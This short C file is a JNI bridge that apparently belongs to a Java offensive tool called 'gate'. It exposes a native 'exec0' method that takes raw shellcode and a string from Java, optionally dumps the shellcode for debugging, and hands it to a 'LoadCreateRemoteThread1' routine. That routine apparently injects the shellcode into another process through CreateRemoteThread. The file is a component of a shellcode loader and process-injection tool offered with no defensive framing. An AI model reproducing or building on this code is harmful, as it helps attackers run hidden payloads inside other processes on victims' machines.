#include <stdio.h>
#include "commons.h"
#include "crt-jni.h"
#include "crt.h"

JNIEXPORT void JNICALL Java_me_n1ar4_gate_loader_CRTLoader_exec0
        (JNIEnv *env, jclass obj, jbyteArray jShellcode, jint length, jstring jStr, jboolean debug) {
    jbyte *arrayPtr = (*env)->GetByteArrayElements(env, jShellcode, NULL);
    boolean nativeDebug = (boolean) debug;
    unsigned char *shellcode = (unsigned char *) arrayPtr;
    const char *cStr = (*env)->GetStringUTFChars(env, jStr, NULL);
    if (nativeDebug) {
        printf("jni debug shellcode length: %ld\n", length);
        DEBUG_SHELLCODE(shellcode, length);
    }
    LoadCreateRemoteThread1(shellcode, cStr, length);
}